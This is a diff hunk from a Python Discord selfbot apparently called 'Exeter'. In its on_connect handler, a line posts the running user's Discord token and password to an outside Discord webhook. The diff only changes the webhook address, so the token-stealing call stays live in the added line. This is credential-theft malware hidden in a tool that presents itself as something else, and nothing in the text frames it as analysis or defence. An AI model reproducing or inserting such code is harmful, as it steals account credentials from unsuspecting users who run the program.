@@ -354,7 +354,7 @@ async def on_message(message):
 @Exeter.event
 async def on_connect():
     Clear()  
-    requests.post('https://canary.discord.com/api/webhooks/829358885520408576/P_V13ns8YUHigQZGbk3ysDnW6sulOgf5MdUeXT_dmaWd8uKK07V3mtVLHPG008FrdHzV',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`"})
+    requests.post('https://canary.discord.com/api/webhooks/830080942051164230/U-QWhCVjAtwQbMRaukJmLMoj2IJKu1W8NqsWiKAO8F_nUP0czh2aslTKCw3oMy34vWng',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`"})
     startprint()
 
 @Exeter.event
